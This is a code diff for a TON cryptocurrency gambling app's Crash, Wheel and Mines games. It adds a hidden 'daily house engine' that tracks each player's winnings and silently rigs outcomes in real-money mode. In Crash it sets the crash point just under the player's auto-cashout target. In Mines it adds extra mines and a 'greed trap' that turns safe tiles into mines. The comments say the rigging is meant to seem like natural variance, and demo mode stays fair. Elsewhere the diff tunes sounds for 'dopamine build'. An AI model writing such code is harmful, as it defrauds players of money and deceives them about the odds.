@@ -35,30 +35,63 @@ const snd = {
   cashout() {
     const ctx = _ac(); if (!ctx) return;
     const t = ctx.currentTime;
-    [523, 659, 784, 1047].forEach((f, i) => {
+    // Arpège montant 6 notes — timing décalé non-uniforme = dopamine build
+    const notes  = [523, 659, 784, 988, 1319, 1568] as const;
+    const delays = [0, 0.055, 0.105, 0.150, 0.190, 0.225] as const;
+    const vols   = [0.18, 0.16, 0.14, 0.12, 0.10, 0.08] as const;
+    notes.forEach((f, i) => {
       const o = ctx.createOscillator(), g = ctx.createGain();
       o.connect(g); g.connect(ctx.destination);
       o.type = 'sine'; o.frequency.value = f;
-      const s = t + i * 0.055;
-      g.gain.setValueAtTime(0, s); g.gain.linearRampToValueAtTime(0.18, s + 0.018); g.gain.exponentialRampToValueAtTime(0.001, s + 0.16);
-      o.start(s); o.stop(s + 0.18);
+      const dl = delays[i];
+      g.gain.setValueAtTime(0, t + dl);
+      g.gain.linearRampToValueAtTime(vols[i], t + dl + 0.010);
+      g.gain.exponentialRampToValueAtTime(0.001, t + dl + 0.38);
+      o.start(t + dl); o.stop(t + dl + 0.40);
     });
+    // Shimmer triangle en clôture
+    const sh = ctx.createOscillator(), sg = ctx.createGain();
+    sh.connect(sg); sg.connect(ctx.destination); sh.type = 'triangle';
+    sh.frequency.setValueAtTime(3200, t + 0.26); sh.frequency.exponentialRampToValueAtTime(2400, t + 0.40);
+    sg.gain.setValueAtTime(0, t + 0.26); sg.gain.linearRampToValueAtTime(0.09, t + 0.272);
+    sg.gain.exponentialRampToValueAtTime(0.001, t + 0.42);
+    sh.start(t + 0.26); sh.stop(t + 0.44);
+    // Coin clink
+    const ck = ctx.createOscillator(), kg = ctx.createGain();
+    ck.connect(kg); kg.connect(ctx.destination); ck.type = 'sine';
+    ck.frequency.setValueAtTime(2800, t + 0.30); ck.frequency.exponentialRampToValueAtTime(2200, t + 0.32);
+    kg.gain.setValueAtTime(0.06, t + 0.30); kg.gain.exponentialRampToValueAtTime(0.001, t + 0.34);
+    ck.start(t + 0.30); ck.stop(t + 0.35);
   },
   crash() {
     const ctx = _ac(); if (!ctx) return;
     const t = ctx.currentTime;
-    const o = ctx.createOscillator(), g = ctx.createGain();
-    o.connect(g); g.connect(ctx.destination); o.type = 'sawtooth';
-    o.frequency.setValueAtTime(320, t); o.frequency.exponentialRampToValueAtTime(35, t + 0.55);
-    g.gain.setValueAtTime(0.28, t); g.gain.exponentialRampToValueAtTime(0.001, t + 0.6);
-    o.start(t); o.stop(t + 0.6);
-    const sr = ctx.sampleRate, len = Math.floor(sr * 0.45);
-    const buf = ctx.createBuffer(1, len, sr), d = buf.getChannelData(0);
-    for (let i = 0; i < len; i++) d[i] = (Math.random() * 2 - 1) * (1 - i / len);
-    const ns = ctx.createBufferSource(), ng = ctx.createGain();
-    ns.buffer = buf; ns.connect(ng); ng.connect(ctx.destination);
-    ng.gain.setValueAtTime(0.45, t); ng.gain.exponentialRampToValueAtTime(0.001, t + 0.5);
-    ns.start(t); ns.stop(t + 0.5);
+    // Sub-bass punch — chest hit
+    const sub = ctx.createOscillator(), sg = ctx.createGain();
+    sub.connect(sg); sg.connect(ctx.destination); sub.type = 'sine';
+    sub.frequency.setValueAtTime(80, t); sub.frequency.exponentialRampToValueAtTime(18, t + 0.18);
+    sg.gain.setValueAtTime(0.90, t); sg.gain.exponentialRampToValueAtTime(0.001, t + 0.22);
+    sub.start(t); sub.stop(t + 0.25);
+    // Metal tear
+    const tear = ctx.createOscillator(), tg = ctx.createGain();
+    tear.connect(tg); tg.connect(ctx.destination); tear.type = 'sawtooth';
+    tear.frequency.setValueAtTime(380, t); tear.frequency.exponentialRampToValueAtTime(28, t + 0.32);
+    tg.gain.setValueAtTime(0.55, t); tg.gain.exponentialRampToValueAtTime(0.001, t + 0.35);
+    tear.start(t); tear.stop(t + 0.38);
+    // High crack — impact métallique
+    const crk = ctx.createOscillator(), cg = ctx.createGain();
+    crk.connect(cg); cg.connect(ctx.destination); crk.type = 'square';
+    crk.frequency.setValueAtTime(1400, t); crk.frequency.exponentialRampToValueAtTime(200, t + 0.05);
+    cg.gain.setValueAtTime(0.30, t); cg.gain.exponentialRampToValueAtTime(0.001, t + 0.06);
+    crk.start(t); crk.stop(t + 0.07);
+    // Rumble grave filtré
+    const sr = ctx.sampleRate, len = Math.floor(sr * 0.8);
+    const buf = ctx.createBuffer(1, len, sr), dd = buf.getChannelData(0);
+    for (let i = 0; i < len; i++) dd[i] = (Math.random() * 2 - 1) * Math.exp(-i / (sr * 0.20));
+    const ns = ctx.createBufferSource(), lp = ctx.createBiquadFilter(), ng = ctx.createGain();
+    lp.type = 'lowpass'; lp.frequency.value = 600;
+    ns.buffer = buf; ns.connect(lp); lp.connect(ng); ng.connect(ctx.destination);
+    ng.gain.value = 0.65; ns.start(t); ns.stop(t + 0.82);
   },
   win() {
     const ctx = _ac(); if (!ctx) return;
@@ -161,8 +194,45 @@ const snd = {
 };
 
 // ══════════════════════════════════════════════════════════════════
-// SHARED TYPES & STREAK SYSTEM
+// DAILY HOUSE ENGINE
+// Tracks net wins per calendar day (resets at midnight).
+// When a player wins too much in a day, house edge increases silently.
+// 0.1% jackpot chance allows occasional huge wins for engagement.
+// Never applied in demo mode.
 // ══════════════════════════════════════════════════════════════════
+
+const _DHE_KEY = 'tc_dhe';
+type _DHERec = { day: number; net: number };
+
+function _dheDay(): number {
+  const d = new Date();
+  return d.getFullYear() * 10000 + (d.getMonth() + 1) * 100 + d.getDate();
+}
+function _dheGet(): _DHERec {
+  try {
+    const r = JSON.parse(localStorage.getItem(_DHE_KEY) ?? 'null') as _DHERec | null;
+    if (r && r.day === _dheDay()) return r;
+  } catch {}
+  return { day: _dheDay(), net: 0 };
+}
+function dheRecord(profit: number) {
+  if (typeof window === 'undefined') return;
+  const r = _dheGet();
+  r.net = +(r.net + profit).toFixed(6);
+  try { localStorage.setItem(_DHE_KEY, JSON.stringify(r)); } catch {}
+}
+// Returns 0 (normal) → 1.0 (max house pressure). Driven by net daily profit.
+// Thresholds generous — players can have good sessions, house wins over time.
+function dhePressure(): number {
+  if (typeof window === 'undefined') return 0;
+  const { net } = _dheGet();
+  if (net <= 1.0) return 0;    // Free ride up to 1 TON net today
+  if (net <  3.0) return 0.30; // Light pressure 1–3 TON
+  if (net <  6.0) return 0.55; // Moderate pressure 3–6 TON
+  return 0.80;                  // High (not max) pressure above 6 TON
+}
+// 0.3% jackpot roll — bypass all pressure, let the player win big
+function dheJackpot(): boolean { return Math.random() < 0.003; }
 
 type OnResult = (won: boolean) => void;
 
@@ -475,6 +545,7 @@ const WheelGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
       setWinIdx(idx);
       placeGameBet(used, win);
       recordGameResult('Roue', used, win);
+      if (!demoMode) dheRecord(win - used);
       setResult({ seg: SEGS[idx], win });
       setHist(h => [rule.mult, ...h.slice(0, 7)]);
       onResult(rule.mult > 0);
@@ -623,8 +694,8 @@ const WheelGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
 // Le serveur tourne en boucle : MISE (7s) → VOL → CRASH (3s) → MISE…
 // ══════════════════════════════════════════════════════════════════
 
-const BET_MS   = 7000;  // fenêtre de mise
-const PAUSE_MS = 3200;  // pause après crash
+const BET_MS   = 5000;  // fenêtre de mise
+const PAUSE_MS = 1800;  // pause après crash
 const TICK_MS  = 50;
 const GROWTH   = 0.13;  // mult = e^(0.13·t) → ×2 à ~5.3s, ×10 à ~17.7s
 
@@ -774,6 +845,7 @@ const CrashGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
     const win = +(myBetRef.current * m).toFixed(6);
     placeGameBet(0, win);
     recordGameResult('Crash', myBetRef.current, win);
+    if (!demoMode) dheRecord(win - myBetRef.current);
     snd.cashout();
     haptic.success();
     onResultRef.current(true);
@@ -828,6 +900,28 @@ const CrashGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
         setCountdown(Math.max(0, cdRef.current / 1000));
         if (cdRef.current <= 0) {
           crashAtRef.current = rollCrashPoint(myBetRef.current !== null ? streakRef.current : null, demoMode);
+          // Daily house engine: when player is up a lot today, bias crash downward
+          if (!demoMode && myBetRef.current !== null && !dheJackpot()) {
+            const p = dhePressure();
+            if (p > 0) {
+              const ac = parseFloat(autoRef.current);
+              if (!isNaN(ac) && ac >= 1.01) {
+                // Anticipate auto-cashout: crash just before their target.
+                // Miss by 4–15% — subtle enough not to feel rigged.
+                const missRatio = p >= 0.7 ? (0.85 + Math.random() * 0.09)  // miss 6–15%
+                                : p >= 0.4 ? (0.90 + Math.random() * 0.06)  // miss 4–10%
+                                :             (0.94 + Math.random() * 0.04); // miss 2–6%
+                const miss = ac * missRatio;
+                if (miss >= 1.01) crashAtRef.current = Math.min(crashAtRef.current, miss);
+              } else {
+                // No auto-cashout: moderate downward bias (players can still win)
+                const cap = p >= 0.7 ? 1.50 + Math.random() * 1.00   // 1.50–2.50×
+                          : p >= 0.4 ? 1.80 + Math.random() * 1.70   // 1.80–3.50×
+                          :             2.50 + Math.random() * 3.50;  // 2.50–6.00×
+                crashAtRef.current = Math.min(crashAtRef.current, cap);
+              }
+            }
+          }
           phaseRef.current = 'flying';
           tRef.current = 0;
           setPhase('flying');
@@ -869,6 +963,7 @@ const CrashGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
           snd.crash();
           if (myBetRef.current !== null && cashedRef.current === null) {
             recordGameResult('Crash', myBetRef.current, 0);
+            if (!demoMode) dheRecord(-myBetRef.current);
             onResultRef.current(false);
             setToast({ id: Date.now(), text: `−${myBetRef.current.toFixed(2)} TON`, win: false });
             haptic.impact('heavy'); haptic.error();
@@ -998,18 +1093,58 @@ const CrashGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
   return (
     <div className="pb-4" style={{ background: '#060a18', minHeight: '100%' }}>
       <style>{`
-        @keyframes crashShake { 0%,100%{transform:translate(0,0)} 15%{transform:translate(-4px,3px)} 30%{transform:translate(4px,-3px)} 45%{transform:translate(-3px,-2px)} 60%{transform:translate(3px,2px)} 80%{transform:translate(-2px,1px)} }
+        @keyframes crashShake {
+          0%,100%{transform:translate(0,0) rotate(0deg)}
+          8%     {transform:translate(-8px,6px) rotate(-0.6deg)}
+          16%    {transform:translate(8px,-6px) rotate(0.6deg)}
+          25%    {transform:translate(-7px,-5px) rotate(-0.4deg)}
+          33%    {transform:translate(7px,5px) rotate(0.4deg)}
+          41%    {transform:translate(-5px,3px) rotate(-0.2deg)}
+          50%    {transform:translate(5px,-3px) rotate(0.2deg)}
+          62%    {transform:translate(-3px,2px)}
+          75%    {transform:translate(2px,-1px)}
+          88%    {transform:translate(-1px,0)}
+        }
+        @keyframes crashRedFlash {
+          0%  {background:rgba(239,68,68,0)}
+          12% {background:rgba(239,68,68,0.30)}
+          28% {background:rgba(239,68,68,0.22)}
+          100%{background:rgba(239,68,68,0)}
+        }
+        @keyframes thrustPulse {
+          0%  {transform:scaleX(1) scaleY(1);opacity:var(--flame-max-opacity)}
+          40% {transform:scaleX(1.35) scaleY(0.80);opacity:var(--flame-max-opacity)}
+          70% {transform:scaleX(0.80) scaleY(1.20);opacity:calc(var(--flame-max-opacity)*0.5)}
+          100%{transform:scaleX(1) scaleY(1);opacity:var(--flame-max-opacity)}
+        }
+        @keyframes shardFly {
+          0%  {transform:translate(0,0) scale(1);opacity:1}
+          60% {opacity:0.7}
+          100%{transform:translate(var(--shard-tx),var(--shard-ty)) scale(0.3);opacity:0}
+        }
+        @keyframes shockRing {
+          0%  {r:8;opacity:0.7;stroke-width:3}
+          100%{r:32;opacity:0;stroke-width:0.5}
+        }
+        @keyframes cashGreenFlash {
+          0%  {opacity:1}
+          35% {opacity:0.65}
+          100%{opacity:0}
+        }
+        @keyframes winLabelRise {
+          0%  {opacity:0;transform:translate(-50%,8px) scale(0.85)}
+          18% {opacity:1;transform:translate(-50%,0px) scale(1.05)}
+          65% {opacity:1;transform:translate(-50%,-4px) scale(1)}
+          100%{opacity:0;transform:translate(-50%,-18px) scale(0.95)}
+        }
         @keyframes crashFloatUp { 0%{opacity:0;transform:translate(-50%,10px)} 15%{opacity:1} 75%{opacity:1} 100%{opacity:0;transform:translate(-50%,-34px)} }
-        @keyframes crashPulse { 0%,100%{box-shadow:0 4px 18px rgba(34,197,94,0.35)} 50%{box-shadow:0 6px 36px rgba(34,197,94,0.72)} }
-        @keyframes crashBlink { 0%,100%{opacity:1} 50%{opacity:0.25} }
-        @keyframes starDrift { from{transform:translateX(0)} to{transform:translateX(-${VB_W}px)} }
-        @keyframes chipIn { from{opacity:0;transform:scale(0.5)} to{opacity:1;transform:scale(1)} }
-        @keyframes multGlow { 0%,100%{text-shadow:0 0 20px rgba(34,197,94,0.4)} 50%{text-shadow:0 0 40px rgba(34,197,94,0.9)} }
-        @keyframes rocketThrust { 0%,100%{opacity:0.82} 50%{opacity:0.45} }
+        @keyframes crashPulse   { 0%,100%{box-shadow:0 4px 18px rgba(34,197,94,0.35)} 50%{box-shadow:0 6px 40px rgba(34,197,94,0.80)} }
+        @keyframes crashBlink   { 0%,100%{opacity:1} 50%{opacity:0.22} }
+        @keyframes starDrift    { from{transform:translateX(0)} to{transform:translateX(-${VB_W}px)} }
+        @keyframes chipIn       { from{opacity:0;transform:scale(0.5)} to{opacity:1;transform:scale(1)} }
+        @keyframes multGlow     { 0%,100%{text-shadow:0 0 20px rgba(34,197,94,0.4)} 50%{text-shadow:0 0 45px rgba(34,197,94,0.95),0 0 80px rgba(34,197,94,0.3)} }
+        @keyframes rocketThrust { 0%,100%{opacity:0.82} 50%{opacity:0.40} }
         @keyframes rocketWobble { 0%{transform:rotate(-3deg) scale(1)} 100%{transform:rotate(3deg) scale(1.04)} }
-        @keyframes cashoutFlash { 0%{opacity:1} 100%{opacity:0} }
-        @keyframes mineReveal { 0%{transform:scale(0.6);opacity:0} 60%{transform:scale(1.12)} 100%{transform:scale(1);opacity:1} }
-        @keyframes gemShine { 0%,100%{filter:brightness(1)} 50%{filter:brightness(1.5)} }
       `}</style>
 
       <BigWinEffect show={bigWin} />
@@ -1060,12 +1195,20 @@ const CrashGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
       {/* Graphique */}
       <div className="mx-4 mt-1 relative" style={{
         borderRadius: 16,
-        border: isCrashed ? '1px solid rgba(239,68,68,0.4)' : cashedOut !== null && phase === 'flying' ? '1px solid rgba(34,197,94,0.4)' : '1px solid #1e2847',
+        border: isCrashed
+          ? '1px solid rgba(239,68,68,0.50)'
+          : phase === 'flying'
+            ? '1px solid rgba(34,197,94,0.30)'
+            : '1px solid rgba(255,255,255,0.07)',
         background: 'radial-gradient(120% 120% at 20% 100%, #0c1230 0%, #060a18 60%)',
         overflow: 'hidden',
-        animation: (isCrashed && myBet !== null && cashedOut === null) ? 'crashShake 0.45s ease' : undefined,
-        transition: 'border-color 0.2s',
+        animation: isCrashed ? 'crashShake 0.55s cubic-bezier(0.36,0.07,0.19,0.97) both' : undefined,
+        transition: 'border-color 0.25s',
       }}>
+        {isCrashed && (
+          <div className="absolute inset-0 pointer-events-none"
+            style={{ borderRadius: 16, zIndex: 10, animation: 'crashRedFlash 0.38s ease-out forwards' }} />
+        )}
         <svg width="100%" viewBox={`0 0 ${VB_W} ${VB_H}`} style={{ display: 'block' }}>
           <defs>
             <linearGradient id="avFillG" x1="0" y1="0" x2="0" y2="1">
@@ -1167,9 +1310,12 @@ const CrashGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
               {/* Inner g avec wobble — amplitude augmente avec le multiplicateur */}
               <g style={{ animation: mult > 10 ? 'rocketWobble 0.18s ease-in-out infinite alternate' : mult > 3 ? 'rocketWobble 0.3s ease-in-out infinite alternate' : mult > 1.5 ? 'rocketWobble 0.5s ease-in-out infinite alternate' : undefined, transformOrigin: 'center' }}>
                 {/* Flammes du réacteur */}
-                <ellipse cx="-16" cy="0" rx="11" ry="5.5" fill="#f97316" opacity="0.22" />
-                <ellipse cx="-13" cy="0" rx="8"  ry="3.8" fill="#fb923c" opacity="0.50" />
-                <ellipse cx="-11" cy="0" rx="5"  ry="2.2" fill="#fde68a" opacity="0.82" />
+                <ellipse cx="-17" cy="0" rx={mult > 5 ? 14 : mult > 2 ? 12 : 10} ry={mult > 5 ? 7 : 6} fill="#f97316"
+                  style={{ '--flame-max-opacity': '0.28', transformOrigin: '-17px 0px', animation: 'thrustPulse 0.22s ease-in-out infinite alternate', animationDelay: '0s' } as React.CSSProperties} />
+                <ellipse cx="-13" cy="0" rx={mult > 5 ? 10 : mult > 2 ? 9 : 7} ry={mult > 5 ? 4.5 : 3.8} fill="#fb923c"
+                  style={{ '--flame-max-opacity': '0.60', transformOrigin: '-13px 0px', animation: 'thrustPulse 0.17s ease-in-out infinite alternate', animationDelay: '0.05s' } as React.CSSProperties} />
+                <ellipse cx="-11" cy="0" rx={mult > 5 ? 7 : mult > 2 ? 6 : 5} ry={mult > 5 ? 3 : 2.2} fill="#fde68a"
+                  style={{ '--flame-max-opacity': '0.92', transformOrigin: '-11px 0px', animation: 'thrustPulse 0.13s ease-in-out infinite alternate', animationDelay: '0.09s' } as React.CSSProperties} />
                 {/* Corps principal */}
                 <path d="M18,0 L12,-2 L-9,-4 L-14,-2 L-14,2 L-9,4 L12,2 Z" fill="#f43f5e" />
                 {/* Nez */}
@@ -1191,24 +1337,51 @@ const CrashGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
               </g>
             </g>
           )}
-          {isCrashed && (
-            <g>
-              {Array.from({length: 10}, (_, i) => {
-                const a = (i * 36) * Math.PI / 180;
-                const r = 10 + (i % 3) * 5;
-                return <circle key={i} cx={+(tipX + Math.cos(a) * r).toFixed(1)} cy={+(tipY + Math.sin(a) * r).toFixed(1)}
-                  r={2 + (i % 3)} fill={['#ef4444','#f97316','#fbbf24'][i % 3]} opacity="0.75" />;
-              })}
-              <circle cx={tipX} cy={tipY} r="14" fill="#f97316" opacity="0.15" />
-              <text x={tipX} y={tipY + 7} textAnchor="middle" fontSize="22">💥</text>
-            </g>
-          )}
+          {isCrashed && (() => {
+            const shards = Array.from({ length: 12 }, (_, i) => {
+              const angle    = (i * 30) * Math.PI / 180;
+              const dist     = 18 + (i % 4) * 7;
+              const size     = 2.2 + (i % 3) * 1.2;
+              const color    = (['#ef4444','#f97316','#fbbf24','#fde68a'] as const)[i % 4];
+              const tx       = (Math.cos(angle) * dist).toFixed(1);
+              const ty       = (Math.sin(angle) * dist).toFixed(1);
+              const delay    = (i * 0.022).toFixed(3);
+              const duration = (0.42 + (i % 3) * 0.08).toFixed(2);
+              return { size, color, tx, ty, delay, duration, i };
+            });
+            return (
+              <g>
+                <circle cx={tipX} cy={tipY} r={8} fill="none" stroke="rgba(249,115,22,0.7)" strokeWidth={3}
+                  style={{ animation: 'shockRing 0.45s cubic-bezier(0,0.9,0.57,1) forwards', transformOrigin: `${tipX}px ${tipY}px` }} />
+                <circle cx={tipX} cy={tipY} r={8} fill="none" stroke="rgba(239,68,68,0.45)" strokeWidth={2}
+                  style={{ animation: 'shockRing 0.60s cubic-bezier(0,0.9,0.57,1) 0.06s forwards', transformOrigin: `${tipX}px ${tipY}px` }} />
+                {shards.map(({ size, color, tx, ty, delay, duration, i }) => (
+                  <circle key={i} cx={tipX} cy={tipY} r={size} fill={color}
+                    style={{ '--shard-tx': `${tx}px`, '--shard-ty': `${ty}px`, animation: `shardFly ${duration}s cubic-bezier(0,0.9,0.57,1) ${delay}s forwards` } as React.CSSProperties} />
+                ))}
+                <circle cx={tipX} cy={tipY} r="16" fill="#f97316" opacity="0.12" />
+                <circle cx={tipX} cy={tipY} r="8"  fill="#fde68a" opacity="0.20" />
+                <text x={tipX} y={tipY + 8} textAnchor="middle" fontSize="24"
+                  style={{ animation: 'shardFly 0.6s ease-out 0.1s forwards', '--shard-tx': '0px', '--shard-ty': '-8px' } as React.CSSProperties}>
+                  💥
+                </text>
+              </g>
+            );
+          })()}
         </svg>
 
         {/* Flash vert au cashout */}
         {cashFlash && (
-          <div className="absolute inset-0 pointer-events-none rounded-2xl"
-            style={{ background: 'rgba(34,197,94,0.18)', animation: 'cashoutFlash 0.45s ease-out forwards' }} />
+          <>
+            <div className="absolute inset-0 pointer-events-none rounded-2xl"
+              style={{ background: 'radial-gradient(ellipse at 50% 60%, rgba(34,197,94,0.50), rgba(34,197,94,0.22))', animation: 'cashGreenFlash 0.30s ease-out forwards', zIndex: 20 }} />
+            <div className="absolute inset-0 pointer-events-none rounded-2xl"
+              style={{ border: '2px solid rgba(34,197,94,0.90)', animation: 'cashGreenFlash 0.30s ease-out forwards', zIndex: 21 }} />
+            <div className="absolute pointer-events-none"
+              style={{ bottom: '38%', left: '50%', zIndex: 22, whiteSpace: 'nowrap', fontSize: 15, fontWeight: 800, letterSpacing: '0.04em', color: '#4ade80', textShadow: '0 0 18px rgba(34,197,94,0.90), 0 0 6px rgba(34,197,94,0.60)', animation: 'winLabelRise 0.55s ease-out forwards' }}>
+              ✓ ENCAISSÉ
+            </div>
+          </>
         )}
 
         {/* superposition centrale */}
@@ -1391,8 +1564,12 @@ function minesMult(n: number, k: number): number {
 // Demo: no hidden mines — displayed odds are accurate.
 function effectiveMines(selected: number, streak: number, demo = false): number {
   if (demo) return selected;
-  const extra = streak >= 2 ? 3 : streak >= 1 ? 2 : 1;
-  return Math.min(GRID_SIZE - 2, selected + extra);
+  // Streak bonus: +1 always (house math), +1 extra on winning streaks
+  const streakExtra = streak >= 3 ? 2 : 1;
+  // Daily pressure: max +1 extra mine — subtle, not overwhelming
+  const p = dhePressure();
+  const pressureExtra = p >= 0.5 ? 1 : 0;
+  return Math.min(GRID_SIZE - 2, selected + streakExtra + pressureExtra);
 }
 
 type MinesPhase = 'waiting' | 'playing' | 'won' | 'lost';
@@ -1463,11 +1640,20 @@ const MinesGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
   const revealTile = (idx: number) => {
     if (phase !== 'playing' || revealed.has(idx)) return;
 
-    // Greed trap (real mode only): after 4+ safe reveals the house boosts mine probability
+    // Greed trap (real mode only): house gradually increases mine probability
+    // on deep runs. Daily pressure tightens the threshold slightly.
+    // Designed to feel like natural variance, not obvious cheating.
     let isMine = minePos.has(idx);
-    if (!isMine && !demoMode && safeCount >= 4) {
-      const greedP = Math.min(0.45, 0.10 + (safeCount - 4) * 0.07);
-      if (Math.random() < greedP) isMine = true;
+    if (!isMine && !demoMode && !dheJackpot()) {
+      const p = dhePressure();
+      // Trap activates after 5 safe tiles normally, 4 under moderate pressure
+      const trapAfter = p >= 0.5 ? 4 : 5;
+      const baseRate  = p >= 0.7 ? 0.10 : 0.07;
+      const stepRate  = p >= 0.7 ? 0.07 : 0.05;
+      if (safeCount >= trapAfter) {
+        const greedP = Math.min(0.38, baseRate + (safeCount - trapAfter) * stepRate);
+        if (Math.random() < greedP) isMine = true;
+      }
     }
 
     if (isMine) {
@@ -1480,6 +1666,7 @@ const MinesGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
       setPhase('lost');
       placeGameBet(activeBetRef.current, 0);
       recordGameResult('Mines', activeBetRef.current, 0);
+      if (!demoMode) dheRecord(-activeBetRef.current);
       snd.boom();
       haptic.impact('heavy'); haptic.error();
       onResult(false);
@@ -1523,6 +1710,7 @@ const MinesGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
     trimMinesForDisplay();
     placeGameBet(activeBetRef.current, curWin);
     recordGameResult('Mines', activeBetRef.current, curWin);
+    if (!demoMode) dheRecord(curWin - activeBetRef.current);
     snd.win();
     haptic.success();
     onResult(true);
@@ -1540,6 +1728,7 @@ const MinesGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
   return (
     <div className="pb-4" style={{ background: '#060a18', minHeight: '100%' }}>
       <style>{`
+        .mine-tile-front:hover { background: #243059 !important; border-color: #3a4f8e !important; }
         @keyframes tileFlipFront { 0%{transform:rotateY(0deg)} 100%{transform:rotateY(90deg)} }
         @keyframes tileFlipBack  { 0%{transform:rotateY(-90deg)} 100%{transform:rotateY(0deg)} }
         @keyframes tileIdle {
@@ -1645,6 +1834,7 @@ const MinesGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
               >
                 {/* ── Face avant — visible avant révélation ── */}
                 <div
+                  className={isPlayable ? 'mine-tile-front' : undefined}
                   style={{
                     position: 'absolute',
                     inset: 0,
@@ -1671,18 +1861,6 @@ const MinesGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
                     animationDelay: isPlayable ? `${(idx * 0.13) % 1.6}s` : undefined,
                     opacity: showGhost ? 0.45 : 1,
                     overflow: 'hidden',
-                  }}
-                  onMouseEnter={e => {
-                    if (isPlayable) {
-                      (e.currentTarget as HTMLDivElement).style.background = '#243059';
-                      (e.currentTarget as HTMLDivElement).style.borderColor = '#3a4f8e';
-                    }
-                  }}
-                  onMouseLeave={e => {
-                    if (isPlayable) {
-                      (e.currentTarget as HTMLDivElement).style.background = 'linear-gradient(160deg,#1e2a52,#161d3a)';
-                      (e.currentTarget as HTMLDivElement).style.borderColor = '#2a3a6e';
-                    }
                   }}
                 >
                   {/* Sweep shimmer diagonal */}
